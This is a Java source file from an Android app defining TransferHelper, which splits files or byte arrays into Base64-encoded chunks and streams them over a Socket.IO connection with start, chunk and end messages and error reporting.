package com.fason.app.core.network;

import android.util.Base64;
import com.fason.app.core.Protocol;
import org.json.JSONObject;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;
import io.socket.client.Socket;

public final class TransferHelper {
    static final int RAW_CHUNK = 384 * 1024;
    public static final int CHUNK_THRESHOLD = 512 * 1024;

    private TransferHelper() {}
    public static boolean shouldChunk(long size) {
        return size >= CHUNK_THRESHOLD;
    }

    public static void streamFile(Socket socket, String channel, File file, JSONObject startMeta) {
        if (socket == null || file == null || !file.exists()) return;
        String tid = generateId();
        try {
            long fileSize = file.length();
            int totalChunks = (int) Math.ceil((double) fileSize / RAW_CHUNK);
            JSONObject start = clone(startMeta);
            start.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_START);
            start.put(Protocol.KEY_TRANSFER_ID, tid);
            start.put(Protocol.KEY_TOTAL_CHUNKS, totalChunks);
            start.put(Protocol.KEY_TOTAL_SIZE, fileSize);
            socket.emit(channel, start);
            try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
                byte[] buf = new byte[RAW_CHUNK];
                int idx = 0;
                int read;
                while ((read = bis.read(buf)) > 0) {
                    if (!socket.connected()) {
                        throw new java.io.IOException("Socket disconnected during transfer");
                    }
                    byte[] chunk = (read == buf.length) ? buf : Arrays.copyOf(buf, read);
                    JSONObject c = new JSONObject();
                    c.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_CHUNK);
                    c.put(Protocol.KEY_TRANSFER_ID, tid);
                    c.put(Protocol.KEY_CHUNK_INDEX, idx);
                    c.put(Protocol.KEY_CHUNK_DATA, Base64.encodeToString(chunk, Base64.NO_WRAP));
                    socket.emit(channel, c);
                    idx++;
                    try { Thread.sleep(10); } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        throw new java.io.IOException("Transfer interrupted");
                    }
                }
            }
            JSONObject end = new JSONObject();
            end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
            end.put(Protocol.KEY_TRANSFER_ID, tid);
            socket.emit(channel, end);
        } catch (Exception e) {
            try {
                JSONObject end = new JSONObject();
                end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
                end.put(Protocol.KEY_TRANSFER_ID, tid);
                end.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "Transfer failed");
                socket.emit(channel, end);
            } catch (Exception ignored) {}
        }
    }

    public static void sendChunked(Socket socket, String channel, byte[] data, JSONObject startMeta) {
        if (socket == null || data == null || data.length == 0) return;
        String tid = generateId();
        try {
            int totalChunks = (int) Math.ceil((double) data.length / RAW_CHUNK);
            JSONObject start = clone(startMeta);
            start.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_START);
            start.put(Protocol.KEY_TRANSFER_ID, tid);
            start.put(Protocol.KEY_TOTAL_CHUNKS, totalChunks);
            start.put(Protocol.KEY_TOTAL_SIZE, data.length);
            socket.emit(channel, start);
            int offset = 0;
            for (int i = 0; i < totalChunks; i++) {
                if (!socket.connected()) {
                    throw new java.io.IOException("Socket disconnected during chunked send");
                }
                int len = Math.min(RAW_CHUNK, data.length - offset);
                JSONObject c = new JSONObject();
                c.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_CHUNK);
                c.put(Protocol.KEY_TRANSFER_ID, tid);
                c.put(Protocol.KEY_CHUNK_INDEX, i);
                c.put(Protocol.KEY_CHUNK_DATA, Base64.encodeToString(
                    Arrays.copyOfRange(data, offset, offset + len), Base64.NO_WRAP));
                socket.emit(channel, c);
                offset += len;
                Thread.sleep(10);
            }
            JSONObject end = new JSONObject();
            end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
            end.put(Protocol.KEY_TRANSFER_ID, tid);
            socket.emit(channel, end);
        } catch (Exception e) {
            try {
                JSONObject end = new JSONObject();
                end.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD_END);
                end.put(Protocol.KEY_TRANSFER_ID, tid);
                end.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "Transfer failed");
                socket.emit(channel, end);
            } catch (Exception ignored) {}
        }
    }

    public static byte[] readSmallFile(File file) {
        try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file))) {
            byte[] data = new byte[(int) file.length()];
            int read, total = 0;
            while ((read = bis.read(data, total, data.length - total)) > 0) {
                total += read;
            }
            return total == data.length ? data : null;
        } catch (Exception e) {
            return null;
        }
    }

    private static JSONObject clone(JSONObject src) {
        try {
            return new JSONObject(src.toString());
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    private static String generateId() {
        return Long.toHexString(System.currentTimeMillis()) + "_" +
               Integer.toHexString((int) (Math.random() * 0xFFFF));
    }
}
